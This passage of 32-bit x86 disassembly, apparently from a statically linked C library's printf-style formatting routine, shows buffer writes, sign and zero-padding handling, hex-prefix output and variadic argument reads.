cmp edx, dword [ecx + 0x18]
jae 0x80656ff
mov byte [edx], al
mov edi, dword [arg_8h]
movzx eax, al
inc dword [edi + 0x14]
inc eax
je 0x8064cc0
inc dword [var_4b0h]
jmp 0x8065651
movzx eax, al
mov dword [esp], ecx
mov dword [var_4h_2], eax
call fcn.0804d840
jmp 0x80656ed
mov dword [var_4h_2], 0x30
mov dword [esp], edi
call fcn.0804d840
inc eax
jne 0x80656ca
jmp 0x8064cc0
mov dword [var_4h_2], 0x2d
mov dword [esp], edx
call fcn.0804d840
inc eax
jne 0x8065632
jmp 0x8064cc0
mov eax, dword [var_54ch]
test eax, eax
je 0x806576b
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8065761
mov byte [eax], 0x2b
jmp 0x806562c
mov dword [var_4h_2], 0x2b
jmp 0x8065730
mov eax, dword [var_544h]
test eax, eax
je 0x8065638
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806578c
mov byte [eax], 0x20
jmp 0x806562c
mov dword [var_4h_2], 0x20
jmp 0x8065730
mov eax, dword [var_564h]
test eax, eax
jle 0x80657c3
mov edx, dword [var_564h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], edx
mov ecx, dword [arg_8h]
mov dword [esp], ecx
call fcn.08075680
add dword [var_4b0h], eax
mov dword [var_564h], 0
jmp 0x8065612
test ebx, ebx
je 0x8065940
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806591e
mov byte [eax], 0x2d
mov ecx, dword [arg_8h]
inc dword [ecx + 0x14]
inc dword [var_4b0h]
dec dword [var_564h]
mov edx, dword [var_53ch]
test edx, edx
je 0x806581b
mov eax, dword [var_540h]
test eax, eax
je 0x806581b
cmp edi, 0x10
je 0x80658a5
mov ebx, dword [var_4bch]
mov edx, dword [var_568h]
sub ebx, esi
lea eax, [edx + ebx]
sub dword [var_564h], eax
test edx, edx
jle 0x8065853
mov dword [var_8h_2], edx
mov dword [var_4h_2], 0x30
mov ecx, dword [arg_8h]
mov dword [esp], ecx
call fcn.08075680
add dword [var_4b0h], eax
mov edi, dword [arg_8h]
mov eax, dword [edi + 0x94]
mov dword [esp], edi
mov dword [var_4h_2], esi
mov dword [var_8h_2], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x8064cc0
add dword [var_4b0h], eax
mov eax, dword [var_564h]
test eax, eax
jle 0x8064620
mov eax, dword [var_564h]
mov dword [esp], edi
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], eax
call fcn.08075680
jmp 0x806461a
mov edi, dword [arg_8h]
mov eax, dword [edi + 0x14]
cmp eax, dword [edi + 0x18]
jae 0x8065906
mov byte [eax], 0x30
mov eax, dword [arg_8h]
inc dword [eax + 0x14]
mov ecx, dword [arg_8h]
inc dword [var_4b0h]
movsx eax, byte [var_56eh]
mov edx, dword [ecx + 0x14]
cmp edx, dword [ecx + 0x18]
jae 0x80658f5
mov byte [edx], al
mov edi, dword [arg_8h]
movzx eax, al
inc dword [edi + 0x14]
inc eax
je 0x8064cc0
inc dword [var_4b0h]
sub dword [var_564h], 2
jmp 0x806581b
movzx eax, al
mov dword [esp], ecx
mov dword [var_4h_2], eax
call fcn.0804d840
jmp 0x80658dc
mov dword [var_4h_2], 0x30
mov dword [esp], edi
call fcn.0804d840
inc eax
jne 0x80658b9
jmp 0x8064cc0
mov dword [var_4h_2], 0x2d
mov dword [esp], edx
call fcn.0804d840
inc eax
jne 0x80657f2
jmp 0x8064cc0
lea esi, [esi]
mov ebx, dword [var_54ch]
test ebx, ebx
je 0x8065967
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x806595d
mov byte [eax], 0x2b
jmp 0x80657ec
mov dword [var_4h_2], 0x2b
jmp 0x8065926
mov ecx, dword [var_544h]
test ecx, ecx
je 0x80657fe
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8065988
mov byte [eax], 0x20
jmp 0x80657ec
mov dword [var_4h_2], 0x20
jmp 0x8065926
dec esi
mov byte [esi], 0x30
jmp 0x8065583
mov eax, dword [var_540h]
test eax, eax
je 0x8065556
dec esi
mov byte [esi], 0x30
jmp 0x8065556
xor eax, eax
cmp byte [var_56eh], 0x58
mov dword [var_8h_2], edi
sete al
mov dword [var_sp_ch], eax
mov eax, dword [var_4bch]
mov dword [var_4h_2], eax
mov edx, dword [var_53ch]
mov dword [esp], edx
call fcn.08063c00
mov ecx, dword [var_550h]
mov esi, eax
test ecx, ecx
je 0x8065a13
mov edx, dword [var_4ach]
test edx, edx
je 0x8065a13
mov ecx, dword [var_4a8h]
mov dword [esp], ecx
mov edx, dword [var_4bch]
mov ecx, dword [var_4ach]
call fcn.08067960
sub esp, 4
mov esi, eax
mov eax, dword [var_56ch]
test eax, eax
je 0x8065556
cmp edi, 0xa
jne 0x8065556
mov eax, dword [var_4bch]
mov dword [esp], esi
mov dword [var_4h_2], eax
call fcn.08063f40
mov esi, eax
jmp 0x8065556
mov dword [var_568h], 1
jmp 0x80659b2
cmp dword [var_568h], 4
mov eax, 5
mov esi, 0x80a0a39
cmovg eax, dword [var_568h]
mov dword [var_568h], eax
jmp 0x8064fd8
mov ecx, dword [var_51ch]
mov esi, dword [var_524h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov eax, dword [esi + eax*4]
jmp 0x80654ef
mov edi, dword [var_4c4h]
mov eax, dword [var_51ch]
lea edx, [edi + edi*2]
shl edx, 4
add eax, edx
test eax, eax
jne 0x8065ab6
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov esi, dword [eax]
jmp 0x8064fe2
mov ecx, dword [var_51ch]
mov edi, dword [var_524h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov esi, dword [edi + eax*4]
jmp 0x8064fe2
mov edx, dword [var_560h]
test edx, edx
jne case.0x80648b6.57
mov eax, dword [var_548h]
dec dword [var_564h]
test eax, eax
jne 0x8065b1c
mov eax, dword [var_564h]
test eax, eax
jle 0x8065b1c
mov edx, dword [var_564h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], edx
mov ecx, dword [arg_8h]
mov dword [esp], ecx
call fcn.08075680
add dword [var_4b0h], eax
mov esi, dword [var_4c4h]
mov eax, dword [var_51ch]
lea edx, [esi + esi*2]
shl edx, 4
add eax, edx
test eax, eax
jne 0x8065ba8
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, byte [eax]
mov edi, dword [arg_8h]
mov edx, dword [edi + 0x14]
cmp edx, dword [edi + 0x18]
jae 0x8065b97
mov byte [edx], al
mov edx, dword [arg_8h]
inc dword [edx + 0x14]
inc eax
je 0x8064cc0
mov eax, dword [var_548h]
inc dword [var_4b0h]
test eax, eax
je 0x8064620
mov eax, dword [var_564h]
test eax, eax
jle 0x8064620
mov ecx, dword [var_564h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], ecx
mov esi, dword [arg_8h]
mov dword [esp], esi
jmp 0x806589b
movzx eax, al
mov dword [esp], edi
mov dword [var_4h_2], eax
call fcn.0804d840
jmp 0x8065b51
mov ecx, dword [var_51ch]
mov esi, dword [var_524h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
movzx eax, byte [esi + eax*4]
jmp 0x8065b3e
mov edx, dword [var_4c4h]
lea eax, [edx + edx*2]
mov edx, dword [var_51ch]
shl eax, 4
add edx, eax
jne 0x8065d31
lea ebx, [var_43ch]
mov eax, edx
mov ecx, 5
cld
mov edi, ebx
mov edx, dword [var_568h]
rep stosd dword es:[edi], eax
movsx eax, byte [var_56eh]
mov ecx, dword [var_564h]
mov dword [var_43ch], edx
mov dword [var_438h], ecx
movzx ecx, byte [var_554h]
mov dword [var_434h], eax
movzx eax, byte [var_558h]
and ecx, 1
and eax, 1
add eax, eax
movzx edx, byte [var_430h]
and edx, 0xfffffffc
or edx, ecx
movzx ecx, byte [var_560h]
or edx, eax
movzx eax, byte [var_540h]
and edx, 0xfffffff3
and ecx, 1
shl ecx, 2
and eax, 1
shl eax, 3
or edx, ecx
movzx ecx, byte [var_544h]
or edx, eax
movzx eax, byte [var_548h]
and edx, 0xffffffcf
and ecx, 1
shl ecx, 4
and eax, 1
shl eax, 5
or edx, ecx
movzx ecx, byte [var_550h]
or edx, eax
movzx eax, byte [var_54ch]
and edx, 0x3f
shl ecx, 7
and eax, 1
shl eax, 6
or edx, eax
movzx eax, byte [var_42fh]
or edx, ecx
mov byte [var_430h], dl
movzx edx, byte [var_56ch]
and eax, 0xfffffff7
and edx, 1
shl edx, 3
or eax, edx
mov byte [var_42fh], al
movsx eax, byte [var_56dh]
mov dword [var_42ch], eax
mov eax, dword [var_554h]
test eax, eax
je 0x8065d20
mov eax, dword [arg_10h]
add dword [arg_10h], 0xc
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_418h], edx
mov dword [var_414h], ecx
mov dword [var_41ch], eax
lea eax, [var_41ch]
mov dword [var_480h], eax
mov dword [var_4h_2], ebx
lea eax, [var_480h]
mov dword [var_8h_2], eax
mov esi, dword [arg_8h]
mov dword [esp], esi
call fcn.08067f60
jmp 0x8064612
mov eax, dword [arg_10h]
add dword [arg_10h], 8
fld qword [eax]
fstp qword [ebp - 0x41c]
jmp 0x8065cf6
mov edi, dword [var_51ch]
mov ecx, dword [var_524h]
mov eax, dword [edi + eax + 0x24]
lea eax, [eax + eax*2]
lea eax, [ecx + eax*4]
mov dword [var_480h], eax
mov dword [var_4h_2], edx
jmp 0x8065d06
mov edi, 0x10
mov esi, dword [var_554h]
xor ebx, ebx
mov dword [var_54ch], 0
mov dword [var_544h], 0
test esi, esi
je 0x8065ed5
mov eax, dword [var_4c4h]
lea edx, [eax + eax*2]
mov eax, dword [var_51ch]
shl edx, 4
add eax, edx
test eax, eax
jne 0x8065eb6
mov eax, dword [arg_10h]
add dword [arg_10h], 8
mov edx, dword [eax]
mov ecx, dword [eax + 4]
mov dword [var_53ch], edx
mov dword [var_538h], ecx
cmp dword [var_568h], 0
jl 0x8065ea7
mov byte [var_56dh], 0x20
jne 0x8065e0c
mov esi, dword [var_538h]
or esi, dword [var_53ch]
jne 0x8065e0c
cmp edi, 8
mov esi, dword [var_4bch]
je 0x8065dfc
mov edx, dword [var_53ch]
or edx, dword [var_538h]
setne al
movzx eax, al
mov dword [var_53ch], eax
jmp 0x8065556
mov ecx, dword [var_540h]
test ecx, ecx
je 0x8065ddf
dec esi
mov byte [esi], 0x30
jmp 0x8065ddf
xor eax, eax
cmp byte [var_56eh], 0x58
mov dword [var_sp_ch], edi
sete al
mov dword [var_10h], eax
mov eax, dword [var_4bch]
mov dword [var_8h_2], eax
mov ecx, dword [var_538h]
mov edx, dword [var_53ch]
mov dword [var_4h_2], ecx
mov dword [esp], edx
call fcn.08063ca0
mov edx, dword [var_550h]
mov esi, eax
test edx, edx
je 0x8065e77
mov ecx, dword [var_4ach]
test ecx, ecx
je 0x8065e77
mov ecx, dword [var_4a8h]
mov dword [esp], ecx
mov edx, dword [var_4bch]
mov ecx, dword [var_4ach]
call fcn.08067960
sub esp, 4
mov esi, eax
mov edx, dword [var_56ch]
test edx, edx
je 0x8065ddf
cmp edi, 0xa
jne 0x8065ddf
mov eax, dword [var_4bch]
mov dword [esp], esi
mov dword [var_4h_2], eax
call fcn.08063f40
mov esi, eax
jmp 0x8065ddf
mov dword [var_568h], 1
jmp 0x8065e0c
mov ecx, dword [var_51ch]
mov eax, dword [ecx + edx + 0x24]
mov ecx, dword [var_524h]
lea eax, [eax + eax*2]
mov edx, dword [ecx + eax*4]
mov ecx, dword [ecx + eax*4 + 4]
jmp 0x8065da4
mov ecx, dword [var_4c4h]
mov eax, dword [var_51ch]
lea edx, [ecx + ecx*2]
shl edx, 4
add eax, edx
test eax, eax
jne 0x8065f2d
mov eax, dword [var_55ch]
test eax, eax
je 0x8065f0c
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, byte [eax]
mov dword [var_53ch], eax
jmp 0x806551f
mov eax, dword [var_558h]
test eax, eax
jne 0x8065f21
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
jmp 0x8065f01
mov eax, dword [arg_10h]
add dword [arg_10h], 4
movzx eax, word [eax]
jmp 0x8065f01
mov eax, dword [var_55ch]
test eax, eax
je 0x8065f50
mov esi, dword [var_51ch]
mov eax, dword [esi + edx + 0x24]
mov edx, dword [var_524h]
lea eax, [eax + eax*2]
movzx eax, byte [edx + eax*4]
jmp 0x8065f01
mov eax, dword [var_558h]
test eax, eax
jne 0x8065f72
mov ecx, dword [var_51ch]
mov esi, dword [var_524h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov eax, dword [esi + eax*4]
jmp 0x8065f01
mov ecx, dword [var_51ch]
mov esi, dword [var_524h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
movzx eax, word [esi + eax*4]
jmp 0x8065f01
mov edi, 8
jmp 0x8065d58
mov edi, 0xa
jmp 0x8065d58
mov eax, dword [var_554h]
mov edi, 0xa
test eax, eax
je 0x8066010
mov eax, dword [var_4c4h]
lea edx, [eax + eax*2]
mov eax, dword [var_51ch]
shl edx, 4
add eax, edx
test eax, eax
jne 0x8065ff4
mov eax, dword [arg_10h]
add dword [arg_10h], 8
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov ebx, edx
shr ebx, 0x1f
je 0x8065fe3
neg eax
adc edx, 0
neg edx
mov dword [var_53ch], eax
mov dword [var_538h], edx
jmp 0x8065db0
mov ecx, dword [var_51ch]
mov esi, dword [var_524h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov edx, dword [esi + eax*4 + 4]
mov eax, dword [esi + eax*4]
jmp 0x8065fd5
mov eax, dword [var_4c4h]
lea edx, [eax + eax*2]
mov eax, dword [var_51ch]
shl edx, 4
add eax, edx
test eax, eax
jne 0x8066048
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov edx, dword [eax]
mov eax, edx
mov ebx, edx
neg eax
shr ebx, 0x1f
cmovne edx, eax
mov dword [var_53ch], edx
jmp 0x806551f
mov ecx, dword [var_51ch]
mov esi, dword [var_524h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov edx, dword [esi + eax*4]
jmp 0x8066031
mov esi, dword [arg_8h]
mov eax, dword [esi + 0x14]
cmp eax, dword [esi + 0x18]
jae 0x806607f
mov byte [eax], 0x25
mov edi, dword [arg_8h]
inc dword [edi + 0x14]
inc dword [var_4b0h]
jmp 0x8064620
mov dword [var_4h_2], 0x25
mov dword [esp], esi
call fcn.0804d840
inc eax
jne 0x8066074
jmp 0x8064cc0
lea ebx, [var_43ch]
xor eax, eax
mov ecx, 5
cld
mov edi, ebx
movzx edx, byte [var_4f0h]
rep stosd dword es:[edi], eax
mov eax, dword [var_4fch]
movzx ecx, byte [var_4f4h]
mov edi, dword [var_500h]
add edx, edx
mov dword [var_438h], eax
movsx eax, byte [var_506h]
shl ecx, 2
mov dword [var_43ch], edi
mov dword [var_434h], eax
movzx eax, byte [var_430h]
and eax, 0xfffffffc
or eax, dword [var_4ech]
or eax, edx
movzx edx, byte [var_4d8h]
and eax, 0xfffffff3
or eax, ecx
movzx ecx, byte [var_4dch]
shl edx, 3
or eax, edx
movzx edx, byte [var_4e0h]
shl ecx, 4
and eax, 0xffffffcf
or eax, ecx
movzx ecx, byte [var_4e4h]
shl edx, 5
or eax, edx
movzx edx, byte [var_4e8h]
shl ecx, 6
and eax, 0x3f
or eax, ecx
shl edx, 7
or eax, edx
mov byte [var_430h], al
movzx eax, byte [var_505h]
mov dword [var_42ch], eax
mov eax, dword [var_4ech]
test eax, eax
je 0x8066253
mov eax, dword [arg_10h]
add dword [arg_10h], 0xc
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_418h], edx
mov dword [var_414h], ecx
mov dword [var_41ch], eax
lea eax, [var_41ch]
mov dword [var_458h], eax
mov dword [var_4h], ebx
lea eax, [var_458h]
mov dword [var_8h], eax
mov edx, dword [arg_8h]
mov dword [esp], edx
call fcn.0806a140
test eax, eax
js 0x8064cc0
lea esi, [esi]
add dword [var_4b0h], eax
mov eax, dword [var_4b8h]
inc dword [var_4c4h]
test eax, eax
jne 0x8066240
lea ecx, [var_444h]
mov dword [var_4h], ecx
mov ebx, dword [var_44ch]
inc ebx
mov dword [var_44ch], ebx
mov dword [esp], ebx
call fcn.08074610
mov esi, dword [arg_8h]
mov dword [var_44ch], eax
mov edx, eax
sub edx, ebx
mov eax, dword [esi + 0x94]
mov dword [esp], esi
mov dword [var_4h], ebx
mov dword [var_8h], edx
call dword [eax + 0x1c]
mov edx, dword [var_44ch]
mov ecx, eax
mov eax, edx
sub eax, ebx
cmp ecx, eax
jne 0x806622a
add dword [var_4b0h], ecx
cmp byte [edx], 0
jne 0x80642f7
jmp 0x80642a6
mov dword [var_4b0h], 0xffffffff
jmp 0x80642a6
lea esi, [esi]
mov edx, dword [var_4b8h]
mov dword [esp], edx
call fcn.08051180
jmp 0x80661c6
mov eax, dword [arg_10h]
add dword [arg_10h], 8
fld qword [eax]
fstp qword [ebp - 0x41c]
jmp 0x806617c
mov eax, 0
mov edi, esp
test eax, eax
je 0x8066374
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x58]
mov dword [var_45ch], 0
mov dword [var_460h], 0
add eax, 0x12
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_460h]
mov dword [var_8h], eax
lea esi, [var_23h_2]
mov eax, dword [arg_10h]
and esi, 0xfffffff0
add dword [arg_10h], 4
mov eax, dword [eax]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.08077b00
cmp eax, 0xffffffff
mov ebx, eax
je 0x8064f80
sub dword [var_4fch], eax
mov eax, dword [var_4e0h]
test eax, eax
jne 0x8066311
mov eax, dword [var_4fch]
test eax, eax
jle 0x8066311
mov edx, dword [var_4fch]
mov dword [var_4h], 0x20
mov dword [var_8h], edx
mov ecx, dword [arg_8h]
mov dword [esp], ecx
call fcn.08075680
add dword [var_4b0h], eax
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x94]
mov dword [esp], edx
mov dword [var_4h], esi
mov dword [var_8h], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x8064f80
mov eax, dword [var_4e0h]
add dword [var_4b0h], ebx
test eax, eax
je 0x806636d
mov eax, dword [var_4fch]
test eax, eax
jle 0x806636d
mov ecx, dword [var_4fch]
mov dword [var_4h], 0x20
mov dword [var_8h], ecx
mov esi, dword [arg_8h]
mov dword [esp], esi
call fcn.08075680
add dword [var_4b0h], eax
mov esp, edi
jmp 0x80661b6
mov eax, dword [0x80a9ab4]
jmp 0x8066282
lea eax, [var_3fch]
mov dword [var_8h], 0x3e8
mov dword [var_4h], eax
mov esi, dword [var_4c8h]
mov dword [esp], esi
call fcn.08053300
mov esi, eax
mov dword [var_4f4h], 0
test esi, esi
mov dword [var_50ch], 0
je 0x8066727
mov edi, dword [var_4f4h]
test edi, edi
jne 0x80665ab
cmp byte [var_506h], 0x53
je 0x80665ab
cmp dword [var_500h], 0xffffffff
je 0x80665a1
mov eax, 0
test eax, eax
je 0x8066597
mov dword [esp], 3
call section.
mov eax, dword [eax]
cmp dword [eax + 0x58], 1
je 0x806657e
mov edx, dword [var_500h]
mov edi, esp
mov dword [var_46ch], esi
mov dword [var_468h], 0
mov dword [var_464h], 0
lea eax, [edx*4 + 0x10]
sub esp, eax
lea eax, [var_468h]
mov dword [var_10h_2], eax
lea edx, [var_23h_2]
lea eax, [var_46ch]
mov ecx, dword [var_500h]
and edx, 0xfffffff0
mov dword [var_4h], eax
mov dword [esp], edx
mov dword [esp + 0xc], ecx
mov dword [var_8h], ecx
call fcn.08078100
inc eax
je 0x8064f80
mov eax, dword [var_46ch]
test eax, eax
jne 0x806656a
mov dword [esp], esi
call fcn.08053400
mov ebx, eax
mov esp, edi
sub dword [var_4fch], ebx
js 0x8066540
mov edx, dword [var_4e0h]
test edx, edx
jne 0x80664c9
mov eax, dword [var_4fch]
test eax, eax
jle 0x80664c9
mov eax, dword [var_4fch]
mov dword [var_4h], 0x20
mov dword [var_8h], eax
mov edx, dword [arg_8h]
mov dword [esp], edx
call fcn.08075680
add dword [var_4b0h], eax
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 0x94]
mov dword [esp], ecx
mov dword [var_4h], esi
mov dword [var_8h], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x8064cc0
mov eax, dword [var_4e0h]
add dword [var_4b0h], ebx
test eax, eax
je 0x8066525
mov eax, dword [var_4fch]
test eax, eax
jle 0x8066525
mov edi, dword [var_4fch]
mov dword [var_4h], 0x20
mov dword [var_8h], edi
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08075680
add dword [var_4b0h], eax
mov eax, dword [var_50ch]
test eax, eax
je 0x80661b6
mov dword [esp], esi
call fcn.08051180
jmp 0x80661b6
mov edi, dword [arg_8h]
mov eax, dword [edi + 0x94]
mov dword [esp], edi
mov dword [var_4h], esi
mov dword [var_8h], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x8064cc0
add dword [var_4b0h], ebx
jmp 0x80661b6
mov ebx, eax
mov eax, dword [var_468h]
sub ebx, esi
and eax, 7
sub ebx, eax
jmp 0x8066484
mov edi, dword [var_500h]
mov dword [esp], esi
mov dword [var_4h], edi
call fcn.08076f30
mov ebx, eax
jmp 0x8066486
mov eax, dword [0x80a9ab4]
jmp 0x80663fd
mov dword [esp], esi
call fcn.08053400
jmp 0x8066590
mov ebx, dword [var_500h]
mov dword [var_478h], esi
mov dword [var_474h], 0
lea edi, [var_474h]
mov dword [var_470h], 0
test ebx, ebx
js 0x8066660
cmp dword [var_500h], 0x1000
ja 0x806662a
mov eax, dword [var_500h]
add eax, 0x12
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h_2]
and esi, 0xfffffff0
mov dword [esp + 0xc], edi
lea eax, [var_478h]
mov edx, dword [var_500h]
mov dword [var_4h], eax
mov dword [esp], esi
mov dword [var_8h], edx
call fcn.08077e00
mov ebx, eax
cmp ebx, 0xffffffff
jne 0x8066486
jmp 0x8064cc0
mov esi, dword [var_500h]
mov dword [esp], esi
call fcn.0807adb0
test eax, eax
jne 0x80665e5
mov eax, dword [var_500h]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8064cc0
mov dword [var_50ch], 1
jmp 0x80665fa
lea ecx, [var_478h]
mov dword [esp + 0xc], edi
mov dword [var_8h], 0
mov dword [var_4h], ecx
mov dword [esp], 0
call fcn.08077e00
cmp eax, 0xffffffff
mov ebx, eax
je 0x8064cc0
mov ecx, dword [var_474h]
test ecx, ecx
jne 0x8066712
mov dword [var_478h], esi
lea esi, [eax + 1]
cmp esi, 0x1000
mov dword [var_510h], esi
ja 0x80666e2
lea eax, [ebx + 0x13]
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h_2]
and esi, 0xfffffff0
mov dword [esp + 0xc], edi
lea ecx, [var_478h]
mov edx, dword [var_510h]
mov dword [var_4h], ecx
mov dword [esp], esi
mov dword [var_8h], edx
call fcn.08077e00
jmp 0x806661c
mov dword [esp], esi
call fcn.0807adb0
test eax, eax
jne 0x80666ae
mov eax, dword [var_510h]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8064cc0
mov dword [var_50ch], 1
jmp 0x80666bd
mov dword [esp + 0xc], 0x80a0a06
mov dword [var_8h], 0x5ed
jmp 0x806535a
cmp dword [var_500h], 0xffffffff
je 0x8066739
cmp dword [var_500h], 5
jle 0x8066748
mov esi, 0x80a0a40
mov ebx, 6
jmp 0x8066486
mov esi, 0x80a4f11
xor ebx, ebx
jmp 0x8066486
mov eax, dword [var_4ech]
test eax, eax
jne 0x80667b6
mov edi, dword [var_4f8h]
test edi, edi
jne 0x806679f
mov esi, dword [var_4f0h]
test esi, esi
je 0x8066789
mov eax, dword [arg_10h]
mov ecx, dword [var_4b0h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov word [eax], cx
jmp 0x80661b6
mov eax, dword [arg_10h]
mov ecx, dword [var_4b0h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov dword [eax], ecx
jmp 0x80661b6
mov eax, dword [arg_10h]
movzx edx, byte [var_4b0h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov byte [eax], dl
jmp 0x80661b6
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov ecx, dword [eax]
mov eax, dword [var_4b0h]
cdq
mov dword [ecx], eax
mov dword [ecx + 4], edx
jmp 0x80661b6
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
test eax, eax
je 0x8066d42
mov edi, 0x10
xor ebx, ebx
mov dword [var_4d4h], eax
mov dword [var_4d8h], 1
mov dword [var_4e8h], 0
mov byte [var_506h], 0x78
cmp dword [var_500h], 0
jl 0x8066d33
mov byte [var_505h], 0x20
jne 0x8066ca0
mov edx, dword [var_4d4h]
test edx, edx
jne 0x8066ca0
cmp edi, 8
mov esi, dword [var_4bch]
je 0x8066c82
mov eax, dword [var_4bch]
sub eax, esi
cmp dword [var_500h], eax
jg 0x8066870
mov eax, dword [var_4d4h]
test eax, eax
je 0x8066870
mov eax, dword [var_4d8h]
test eax, eax
je 0x8066870
cmp edi, 8
je 0x8066c79
lea esi, [esi]
mov edx, dword [var_4bch]
mov eax, 0
mov ecx, dword [var_4e0h]
sub edx, esi
sub dword [var_500h], edx
cmovns eax, dword [var_500h]
test ecx, ecx
mov dword [var_500h], eax
jne 0x8066abf
lea eax, [eax + edx]
sub dword [var_4fch], eax
mov eax, dword [var_4d4h]
test eax, eax
je 0x80668d4
mov ecx, dword [var_4d8h]
test ecx, ecx
je 0x80668d4
mov eax, dword [var_4fch]
sub eax, 2
cmp edi, 0x10
cmovne eax, dword [var_4fch]
mov dword [var_4fch], eax
test ebx, ebx
jne 0x80668ec
mov edx, dword [var_4e4h]
test edx, edx
jne 0x80668ec
mov eax, dword [var_4dch]
test eax, eax
je 0x80668f2
dec dword [var_4fch]
cmp byte [var_505h], 0x20
je 0x8066a83
test ebx, ebx
je 0x8066a31
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8066a15
mov byte [eax], 0x2d
mov ecx, dword [arg_8h]
inc dword [ecx + 0x14]
inc dword [var_4b0h]
mov eax, dword [var_4d4h]
test eax, eax
je 0x806693e
mov eax, dword [var_4d8h]
test eax, eax
je 0x806693e
cmp edi, 0x10
je 0x80669a3
mov eax, dword [var_500h]
add dword [var_4fch], eax
mov ebx, dword [var_4fch]
test ebx, ebx
jle 0x8066977
mov edx, dword [var_4fch]
mov dword [var_4h], 0x30
mov dword [var_8h], edx
mov ecx, dword [arg_8h]
mov dword [esp], ecx
call fcn.08075680
add dword [var_4b0h], eax
mov edi, dword [arg_8h]
mov ebx, dword [var_4bch]
mov eax, dword [edi + 0x94]
sub ebx, esi
mov dword [esp], edi
mov dword [var_8h], ebx
mov dword [var_4h], esi
call dword [eax + 0x1c]
cmp eax, ebx
je 0x80661b0
jmp 0x8064cc0
mov edi, dword [arg_8h]
mov eax, dword [edi + 0x14]
cmp eax, dword [edi + 0x18]
jae 0x80669fd
mov byte [eax], 0x30
mov eax, dword [arg_8h]
inc dword [eax + 0x14]
mov ecx, dword [arg_8h]
inc dword [var_4b0h]
movsx eax, byte [var_506h]
mov edx, dword [ecx + 0x14]
cmp edx, dword [ecx + 0x18]
jae 0x80669ec
mov byte [edx], al
mov edi, dword [ebp + 8]
movzx eax, al
inc dword [edi + 0x14]
inc eax
je 0x8064cc0
inc dword [ebp - 0x4b0]
jmp 0x806693e
movzx eax, al
mov dword [esp], ecx
mov dword [esp + 4], eax
call fcn.0804d840
jmp 0x80669da
mov dword [var_4h], 0x30
mov dword [esp], edi
call fcn.0804d840
inc eax
jne 0x80669b7
jmp 0x8064cc0
mov dword [var_4h], 0x2d
mov dword [esp], edx
call fcn.0804d840
inc eax
jne 0x806691f
jmp 0x8064cc0
mov eax, dword [var_4e4h]
test eax, eax
je 0x8066a58
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8066a4e
mov byte [eax], 0x2b
jmp 0x8066919
mov dword [var_4h], 0x2b
jmp 0x8066a1d
mov eax, dword [var_4dch]
test eax, eax
je 0x8066925
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8066a79
mov byte [eax], 0x20
jmp 0x8066919
mov dword [var_4h], 0x20
jmp 0x8066a1d
mov eax, dword [var_4fch]
test eax, eax
jle 0x8066ab0
mov ecx, dword [var_4fch]
mov dword [var_4h], 0x20
mov dword [var_8h], ecx
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08075680
add dword [var_4b0h], eax
mov dword [var_4fch], 0
jmp 0x80668ff
test ebx, ebx
je 0x8066c27
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8066c0b
mov byte [eax], 0x2d
mov ecx, dword [arg_8h]
inc dword [ecx + 0x14]
inc dword [var_4b0h]
dec dword [var_4fch]
mov eax, dword [var_4d4h]
test eax, eax
je 0x8066b08
mov eax, dword [var_4d8h]
test eax, eax
je 0x8066b08
